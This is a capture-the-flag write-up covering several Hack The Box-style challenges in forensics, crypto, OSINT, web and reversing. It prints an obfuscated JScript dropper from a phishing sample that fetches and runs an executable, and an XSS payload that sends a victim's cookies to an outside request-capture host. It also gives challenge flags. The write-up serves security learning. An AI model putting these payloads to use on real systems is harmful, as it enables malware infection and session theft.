![](assets/Pasted%20image%2020241206164932.png)
# [Forensics]()

{% tabs %}

{% tab title="Glowup" %} 

We managed to retrieve some artifacts from a recent phishing incident. To further investigate the attack we need to analyse the provided document. Examine it and find out what the next steps of the malware are.

## [Approach]()

Checking provided zip file. After extracting it I found artifacts.js file.

![](assets/Pasted%20image%2020241202135134.png)

```javascript
var urls = ["loqKjo3E0dGTl4yfl5mMkYuO0JaKnNGJjtOXkJ2Si5qbjdGJlZ2Jx87MzsvR", "loqKjo3E0dGZm5HTl4rQloqc0Z2NjdGPzYTNkpSRzcfK0baqvIXOnJiLjZ3Kis+QmaGKls2hrYqMz5CZjaHPjaGQzoqhzZDOi5mWgw==", "loqKjo3E0dGdn4ybm4zQloqc0YmO052RkIqbkIrRzpCEjo6Gj8rH0Q==", "loqKjo3E0dGZm5HTl4rQloqc0Z2NjdGPzYTNkpSRzcfK0Q==", "loqKjsTR0YmJidCdnJCQm4mNmpeMm52K0JaKnNGJkYyajoybjY3Ry5LPlY6GysvR", "loqKjo3E0dGVn4yHn4qWn5LQloqc0YmO052RkIqbkIrRzM3P0Q=="],
    activeXObject = "ActiveXObject";

function xd(e, n) {
    for (var t = new Uint8Array(e.length), l = 0; l < e.length; l++) t[l] = e[l] ^ n;
    return t
}

function bnx(e, n) {
    for (var t = atob(e), l = new Uint8Array(t.length), o = 0; o < t.length; o++) l[o] = t.charCodeAt(o);
    return xd(l, n)
}

function dd(e) {
    var n = new activeXObject("MSXML2.XMLHTTP");
    return (n.open("GET", e, !1), n.send(), 200 == n.status) ? n.ResponseBody : null
}

function gop() {
    var e = new activeXObject("Scripting.FileSystemObject"),
        n = "\\" + Math.random().toString(36).substr(2, 9) + ".exe";
    return e.GetSpecialFolder(2) + n
}

function snr(e) {
    var n = gop(),
        t = new activeXObject("ADODB.Stream");
    t.Open(), t.Type = 1, t.Write(e), t.Position = 0, t.SaveToFile(n, 2), t.Close(), new activeXObject("WScript.Shell").Run(n)
}

function start(e, n) {
    WshShell = WScript.CreateObject("WScript.Shell"), Text = atob("VGhlcmUgd2FzIGFuIGVycm9yIG9wZW5pbmcgdGhpcyBkb2N1bWVudC4gVGhlIGZpbGUgaXMgZGFtYWdlZCBhbmQgY291bGQgbm90IGJlIHJlcGFpcmVkIChmb3IgZXhhbXBsZSwgaXQgd2FzIHNlbnQgYXMgYW4gZW1haWwgYXR0YWNobWVudCBhbmQgd2Fzbid0IGNvcnJlY3RseSBkZWNvZGVkKS4"), Title = atob("Tm90IFN1cHBvcnRlZCBGaWxlIEZvcm1hdA=="), Res = WshShell.Popup(Text, 0, Title, 64), n && snr(e)
}
for (var i = 0; i < urls.length; i++) var decodedData = bnx(urls[i], 254),
    data = dd(String.fromCharCode.apply(null, decodedData));
```

I made changes to below function and ran JS online

```js
function dd(e) {
    console.log(e)
    return;
    var n = new activeXObject("MSXML2.XMLHTTP");
    return (n.open("GET", e, !1), n.send(), 200 == n.status) ? n.ResponseBody : null
}
```

This logged below result

```
https://miraigroup.htb/wp-includes/wkcw90205/
https://geo-it.htb/css/q3z3ljo394/HTB{0bfusc4t1ng_th3_Str1ngs_1s_n0t_3n0ugh}
https://career.htb/wp-content/0nzppxq49/
https://geo-it.htb/css/q3z3ljo394/
http://www.cbnnewsdirect.htb/wordpress/5l1kpx45/
https://karyathal.htb/wp-content/231/
```

And found the flag `HTB{0bfusc4t1ng_th3_Str1ngs_1s_n0t_3n0ugh}`

{% endtab %}

{% tab title="Merging rivers" %} 

We have noticed lately that some Pages in our Knowledge base have been altered and reflected bad practices! We have checked our Confluence users but we didn't find anything out of place... However, we did have a network capture somewhere that might be of help! Can you help us out by finding how the attacker managed to get access to our Knowledge base? Hopefully when found, we can fix it so it wont happen again!

## [Approach]()

Extracted given zip file. Got capture.pcapng file

![](assets/Pasted%20image%2020241202135547.png)

Checking http protocol as description says this is regarding confluence page.

![](assets/Pasted%20image%2020241202141245.png)

After checking some packets, it was clear that attacker was abusing `CVE-2023-22527`. 
After going through all http packets lastly I found the packet where attacker was trying to get RCE.

![](assets/Pasted%20image%2020241202141540.png)

After decoding the `jwt.private.key` I found the flag.

```
┌──[hexadivine@hackthebox]─[~]
└──╼ $ echo SFRCe0FuMHRoM3JfZDR5XzRuMHRoM3JfYzBuZmx1M25jM19SQzMhIX0= | base64 -d
HTB{An0th3r_d4y_4n0th3r_c0nflu3nc3_RC3!!}
```

{% endtab %}

{% endtabs %}

# [Crypto]()

{% tabs %}

{% tab title="based0x" %} 

Before starting the journey into the world of cryptography, one should first build strong fundamental knowledge of how encoding schemes work. Lesson #1: Encoding is different than encryption.

## [Attempt]()

Extracted zip file and found below 2 files

```
┌──[hexadivine@hackthebox]─[~/ctf/htb]
└──╼ $ unzip crypto_based0x.zip 
Archive:  crypto_based0x.zip
   creating: crypto_based0x/
  inflating: crypto_based0x/source.py  
  inflating: crypto_based0x/output.txt  
  
┌──[hexadivine@hackthebox]─[~/ctf/htb/crypto_based0x]
└──╼ $ ll 
total 12K
-rw-r--r-- 1 lnxuser lnxuser 5.7K Apr 24  2023 output.txt
-rw-r--r-- 1 lnxuser lnxuser  285 Apr 24  2023 source.py
```

Checking content of output.txt file 

```
┌──[hexadivine@hackthebox]─[~/ctf/htb/crypto_based0x]
└──╼ $ cat output.txt 
56477853546b31724f56565a656c4a4f59577446656c52596347704e52545678556c524f546d467454586455625842575457733152564e595a4539686247743556465a53616d56564d5846525645354f556b5a776356527463455a4e617a45325631525754324a5756586c55626e424b5a4441314e6c5255536b35575230313656466477516b30774d58465856455a505a577377656c5256556c704e565456785646524f54314a4662444e55625842615457733156566474644539686131563556316877576b31564e545a555747784f556b5a77644652744d55354e617a564655323134546d46725258645557484261546c55314e6c6455536c4257526e427856473078546b30774f565654574752505a57314e65565177556d704f565446785556524b55464a4763485255626e42715a56557852566455526b3969566c563556477453536d51774e545a5856457051566b5a72654652756347704e617a6c565632313454324674546a565556564a615a5555314e6c5655546b3953526d743456473078556b30774d55565a656b4a4f59577446656c52586346704e565456305646524b546c5a4854586455625842575457733152564e595a4539686246563556327853616d56464e545a5756457051566b644f4e56527463465a6c565446465758704b543246746333705557484261546c55314e6c5655536d46686255343156466378566d56564d555656625852505957745665566473556b706b4d4455325556524b546c5a48546a5655626e425354577335565664596345396c6246563556316877576d56464e545a545747784f556b5a724d5652744d565a4e4d4445325631524754324a575658705557484261546c553163564e55536c706c6247743456466477516b31724d545a5856455a50596c557765565273556c706c565455325531524b546c5a4854586455625842575457733152564e595a453968617a42355632317759574a464e545a5856457051566b5a734e6c527563464a4e617a6c565632307854324a57566a565556564a715a5773314e6c5655536c4257526e427956473577566b317362445a58574768505a57784665565273556c704e525446785556524f546c4a48546a56556258427954577877565664596345396862584e3656465653595746724e5846575645354f5a5774734d31527463464a4e617a465657587057546d4a57566a565556564a575a5773314e6c5a55546b35686247743456466477516b31724e584658574768505957317a655664596345706b4d4456305631524f546d467262444e55625842795457787756564e595a45396c617a423556465a53576b35564e5846565747784f556b644e656c527463465a4e4d44453257587043546d4a57566a565556564a575a56553163574636536b396c6247737756473577556d56564d555658625852505a5731304e565256556c704e617a55325531524b5957467363484e55626e42535a56557852566455566b396c6245593156465653616b30774e58525856453550566b5a776331527463464a6c5654464656316877543246725658705562464a715a57733163565a5962453553526d743556473577566b317362445a58625842505a5731304e565256556c706c5254563056566873546c4a48546a5a55625446615454417863566b7a6245396c6258513156465653576b35564e58465857477868566b56734d315273556b354e617a6c4656315247546d467252586c58566c4a68596c553163574636536d46575230313356473577566b30774d58465856455a4f595774466556527563474669565456305631524b54314a4763484e5562584257545441784e6c6b7a63453568613056355644465359574a464e545a5656457050566b644f4e56527463465a4e4d44453257587043546d467252586c5561314a615456553163564e55536b35575230313356473177636b3173634656585645354f5957744665565272556c704f5654567856566873546c4a4763485255626e42575454413152566c36546b39686246563556444653576b30774e5846614d327868566b56734d315272556e4a4e4d4445325531686b5432567352586c554d564a685954413163565a5962453553526d743556473577536b3173634846586258524f59577446656c5272556c704f52545678566c524b59564a4662444e55625842615454413156566474634539695654453156465653595745774e545a684d32784f556b5a72656c52744d56704e6248425656315247546d467252586c554d564a68596b557863564655546b396c6247743456473078566b30774e5556546258684f59577446643164746346704e617a46785556524b59565a47634852555633424354577335565664746545396c624556365646647759574a564e58465656453550566b5a734e6c527463465a4e617a56465531686b5432467256586c5861314a4b5a44413164465255536c42575230313356473177566b30774d584658574768505a577846656c5273556d706c56545678566c6873546c4a4761336855626e4275545773784e6c6455526b39695654423556316877576b31564e5852575645704f5a5778726546525863454a4e6248424657544e73546d467252587055574842715455553163574636536d46535230313456473078546b31724d56565a656b4a505957785665565272556b706b4d4456785646524b5957467363484e55626e425354544178635664596145396c617a423656477453576b31564e5846565747784f556b5a724d5652744d565a4e617a453257544e735432467356586c55566c4a715a57733163574636536d4657526d743656466378566d56564d555656574768505957314e65565273556b706b4d4455325646524b5957467363484655625842535a56557852566b7a63453969566d743556327453576b31564d584652564570505957314e654652744d55354e624777325531686b54324a564d486c554d564a685956553163565a59624535535230343156473177636b31724d545a5856464a4f5957744665566473556c704e5654553257544e7359565a4662444e5561314a4754577877525664744d55396c6246563556327853616b31464e58465756457050556b56734d3152756345704e617a565657544e6b5432467356586c55566c4a715455553163565a55536b39535257777a56473177526b30774d545a54574752505957747265565273556d4668617a56785958704b54315a4854586c55625842575457733152564e595a45396862584e3556327853536d51774e5846555645706859577877633152746346704e617a6c56563231345432467356586c5561314a4b5a44413164464a55546b39575230313556473177566b31736346565856465a50596c557765565273556b7469525446785556524754325673617a4255625842475454413152564e595a4539686131563556327453536d51774e5556684d32784f556b644e6431527463455a4e62477732563231735432467463336c5862464a615454417863564655536b3557526d773156473078576b30774e56565a656b4a4f545778734e565256556c4a4f52545678566c524f546d467361336855563342435457733556566b7a63453568613056365644465359574a564e545a575645354f595774734d3152746346704e624777325631686f54324674546a565556564a505955557863564655516c4253526c563356477453536b30786248465856455a50596c5a56655652596345356b4d44567856566877546c5a4763484e556258427154565a77635652596145396c617a42345632317759574a464d545a5256453550556b5a616446527563464a4e617a6c465646687754315978613370555748424f54555531644656596345356c6246703056466877556b30774d545a57625446505957785665566473556c706c617a55325531524f55465a48546a4e55626e42535a577378565652595a453969566c5636563274464f5642525054303d
```

Seeing content of source.py  file

```python
from secret import FLAG
import base64

def encode(m):
    m = m.hex().encode()
    for _ in range(3):
        m = base64.b64encode(m)
    return m


if __name__ == "__main__":
    encoded_flag = encode(FLAG)

    with open('output.txt', 'w') as f:
        f.write(encoded_flag.hex())
```

The python file converted flag to hex and then encoded the flag 3 times with base64 and again encoded to hex. Reversing this process using [cyberchef](https://gchq.github.io/CyberChef/) 

![](assets/Pasted%20image%2020241202163735.png)

This gave the flag - `HTB{enc0d1ng_1s_n0t_th3_s4m3_4s_encrypt10n}`

{% endtab %}

{% endtabs %}

# [Osint]()

{% tabs %}

{% tab title="part-1-samantha-zephyr-williams" %} 

Samantha Zephyr Williams is a skilled computer science graduate and game developer with a passion for virtual reality and gaming. She is known in the OASIS as "sam4nexpl01t3r" and has gained a reputation as a fierce warrior in the virtual arena. Can you track her social media presence, which she uses to connect with fellow gamers and share updates on her OASIS egg-hunting adventures?

## [Attempt]()

Searched username on all platforms 

![](assets/Pasted%20image%2020241202160240.png)
![](assets/Pasted%20image%2020241202160348.png)
![](assets/Pasted%20image%2020241202160354.png)

Found on [twitter](https://x.com/sam4nexpl01t3r)

![](assets/Pasted%20image%2020241202160422.png)

Scanning the QR code below.

![](assets/Pasted%20image%2020241202160453.png)

Found the flag `HTB{Qr_C0D35_4r3_n0T_th4t_s4f3}`

{% endtab %}

{% tab title="part-2-ooo-oasis" %} 

Might it be astonishing to you that some players tend to overlook the enabling of an automated "Out of Office" response upon venturing into the OASIS?

## [Attempt]()

It seems like automated response is enable. Trying sending email to samanthazephyrwilliams@gmail.com which was found from the [CV](https://drive.google.com/file/d/1n0kXyt49Qxf-jdGB7CSgP6wlIJKhz9Pj/view).

Got below response with the flag `HTB{yoUr_s1gn4tuR3_maY_p0s3_4_r1sK}`

![](assets/Pasted%20image%2020241202161429.png)

{% endtab %}

{% tab title="part3-meta-oasis" %} 

Were you aware that software used to create documents automatically includes a type of information known as metadata, which can be described as data describing data?

## [Attempt]()

Searching on google found [this ](https://www.scribd.com/document/747494457/Samantha-Zephyr-Williams-CV)pdf file. Found her blog page [here](https://sam4nexpl01t3r.blogspot.com/2023/02/find-my-cv-here.html) and the cv uploaded [here](https://drive.google.com/file/d/1n0kXyt49Qxf-jdGB7CSgP6wlIJKhz9Pj/view). After downloading CV I ran exiftool that gave the flag

```
┌──[hexadivine@hackthebox]─[~/ctf/htb]
└──╼ $ exiftool Samantha\ “Zephyr”\ Williams\ -\ CV.pdf 
ExifTool Version Number         : 12.57
File Name                       : Samantha “Zephyr” Williams - CV.pdf
Directory                       : .
File Size                       : 50 kB
File Modification Date/Time     : 2024:12:02 15:51:57+05:30
File Access Date/Time           : 2024:12:02 15:51:58+05:30
File Inode Change Date/Time     : 2024:12:02 15:54:38+05:30
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
Linearized                      : No
Page Count                      : 2
PDF Version                     : 1.5
Create Date                     : 0000:01:01 00:00:00
Producer                        : 
Title                           : 
Author                          : sam4nexpl01t3r
Creator                         : 
Modify Date                     : 0000:01:01 00:00:00
Flag                            : HTB{met4d4t4_m1ghT_3xp053_1nf0}
Subject                         : 
```


{% endtab %}

{% endtabs %}

# [Web]()

{% tabs %}

{% tab title="dscada" %} 

Meet dSCADA, the next-generation SCADA and HMI Panel for Industrial Systems. The panel is currently in the beta stage and is operating on a prototype. Can you take a look and see if it contains any security vulnerabilities?

## [Recon]()

Checking provided ip <http://94.237.62.166:51028/>

![](assets/Pasted%20image%2020241202164434.png)

Able to login with admin:admin

![](assets/Pasted%20image%2020241202165028.png)

Checking settings. 

![](assets/Pasted%20image%2020241202165048.png)

## [Exploitation]()

The response message show that it is executing shell command. We can exploit Command Injection.

![](assets/Pasted%20image%2020241202173143.png)
![](assets/Pasted%20image%2020241202173123.png)

Executing the `readflag` file gave the flag - `HTB{gr3p3d_my_w4y_thr0ugH_rc3}`

{% endtab %}

{% tab title="healthcurly" %} 

Can you outsmart the application to unlock hidden gateways?

## [Recon]()

Checking the website

![](assets/Pasted%20image%2020241202173628.png)

## [Exploitation]()

This is executing curl command. We can exploit Command Injection vulnerability.

![](assets/Pasted%20image%2020241202173825.png)

Reading flag file.

![](assets/Pasted%20image%2020241202183128.png)
{% endtab %}

{% tab title="quotes-blog" %} 

We've been working hard on our new startup "Quotes Blog", a crowdsourced quotes submission platform. Can you review this application for any vulnerabilities before we launch this platform?

## [Recon]()

Checking the website

![](assets/Pasted%20image%2020241202183500.png)
![](assets/Pasted%20image%2020241202183512.png)

Trying below code to test if it is vulnerable to XSS; and it is.

![](assets/Pasted%20image%2020241203005951.png)![](assets/Pasted%20image%2020241203010013.png)

## [Exploitation]()

As the code suggest that admin checks the quote (i.e. visit the page.). This will be helpfull to leverage xss to get admin cookies.

![](assets/Pasted%20image%2020241203010301.png)![](assets/Pasted%20image%2020241203010343.png)

My first thought was to use ngrok's http for public domain but its default page shows warning first and requires paid version to view without warning hence using `requestbin`.

![](assets/Pasted%20image%2020241203010608.png)
![](assets/Pasted%20image%2020241203010619.png)

**Due to this restriction I am using <https://beeceptor.com/> for more alternative search requestbin (<https://pipedream.com/requestbin>)**

![](assets/Pasted%20image%2020241203012107.png)
![](assets/Pasted%20image%2020241203012121.png)

Creating payload for the XSS.

```
<script>document.location='https://hackthebox.free.beeceptor.com/'+document.cookie;</script>
```

![](assets/Pasted%20image%2020241203012520.png)

When admin bot visited the site our payload redirected the cookies to public http server.

![](assets/Pasted%20image%2020241203012535.png)

The flag is -  `HTB{m0r3_th4n_ju5t_al3rts}`

{% endtab %}

{% endtabs %}

# [Reversing]()

{% tabs %}

{% tab title="spelunking" %} 

An ancient treasure has been located deep underground in a complex network of caves. Unfortunately, a cave-in has made it impossible to access it through normal means...

## [Attempt]()

Extracted provided zip file

![](assets/Pasted%20image%2020241202142030.png)

Checking file.

```
┌──[hexadivine@hackthebox]─[~/ctf/htb/rev_spelunking]
└──╼ $ file spelunking 
spelunking: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=23cd0c4f434f18bf0207efc4e1e087546faa8c64, for GNU/Linux 3.2.0, not stripped
```

Tried to check with strings. Below gave the flag.

```
┌──[hexadivine@hackthebox]─[~/ctf/htb/rev_spelunking]
└──╼ $ strings spelunking  | grep htb -i
HTB{tr34sur3s_bur13d_d33p_und3rgr0und}
```

{% endtab %}

{% tab title="unpacking" %} 

Before you enter the Oasis, you'll need to acquire top-of-the-line tech to give you the edge. You've ordered a brand-new X1 Haptic Bootsuit - now you just need to unpack it.

## [Attempt]()

Checking files

![](Pasted%20image%2020241202142743.png)

Performing strings check 

```
┌──[hexadivine@hackthebox]─[~/ctf/htb/rev_unpacking]
└──╼ $ strings unpacking | grep htb -i
b$nd new X1 HTB (HapTic Boot
HTB{T6-Ultimat
```

Got first half. Finding second half. Got last part.

```
┌──[hexadivine@hackthebox]─[~/ctf/htb/rev_unpacking]
└──╼ $ strings unpacking | grep -E .*-.*
nux-x86-
HTB{T6-Ultimat
n-cker}
$Id: UPX 4.01 Copyright (C) 1996-2022 the UPX Team. All Rights Reserved. $
-ps?
GCC: (Debian 10.2.1-6)	 
no.gnu.build-id
ABI-(g
 ?4-
```

Above part showed the last part of flag but more importantly it showed that it is UPX file. Hence decompiling it.

```
┌──[hexadivine@hackthebox]─[~/ctf/htb/rev_unpacking]
└──╼ $ upx -d unpacking 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.2       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 3rd 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     28571 <-      5308   18.58%   linux/amd64   unpacking

Unpacked 1 file.
```

Running strings again.

```
┌──[hexadivine@hackthebox]─[~/ctf/htb/rev_unpacking]
└──╼ $ strings unpacking | grep -E .*-.*
/lib64/ld-linux-x86-64.so.2
HTB{The-Ultimate-Elf-Unpacker}
GCC: (Debian 10.2.1-6) 10.2.1 20210110
.note.gnu.build-id
.note.ABI-tag
```

Found the flag `HTB{The-Ultimate-Elf-Unpacker}`

{% endtab %}

{% endtabs %}